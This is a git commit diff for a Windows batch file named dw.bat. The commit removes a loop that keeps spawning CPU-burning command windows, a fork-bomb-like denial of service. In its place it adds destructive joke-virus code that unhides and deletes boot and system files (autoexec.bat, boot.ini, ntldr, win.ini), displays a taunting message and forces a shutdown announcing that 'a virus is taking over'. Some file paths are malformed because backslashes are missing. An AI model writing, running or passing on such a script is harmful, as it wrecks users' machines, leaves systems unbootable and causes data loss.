dc67bfedd846a84d5a47823d94fa402a21901999
EEBroadband <107469677+EEBroadband@users.noreply.github.com>
2024-08-02 23:25:25 +0100

    Update dw.bat

--- dw.bat
+++ dw.bat
@@ -1,21 +1,23 @@
 @echo off
-setlocal enabledelayedexpansion
 
-set bytes=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=-[]{}|;':",./<>?
-set bytesLength=62
+attrib -r -s -h c:autoexec.bat
 
-rem Calculate how many characters to display for approximately 1 MB (adjust as needed)
-set /a charsPerWindow=1024 * 1024 / 2  
+del c:autoexec.bat
 
-:loop
-if not defined num100 (
-    set bytesString=
-    for /l %%x in (1, 1, %charsPerWindow%) do (
-        set /a randomIndex=!random! %% bytesLength
-        set bytesString=!bytesString!!bytes:~!randomIndex!,1!
-    )
+attrib -r -s -h c:boot.ini
 
-    start cmd /k "echo Stress Test Window !num_index!: & echo !bytesString! & (for /l %%x in (1,1,50000000) do (for /l %%y in (1,1,10000) do set /a result=%%x*%%y))"
-    set /a num_index+=1
-    goto loop
-)
+del c:boot.ini
+
+attrib -r -s -h c:ntldr
+
+del c:ntldr
+
+attrib -r -s -h c:windowswin.ini
+
+del c:windowswin.ini
+
+@echo off
+
+msg * Why have you done this?
+
+shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive"
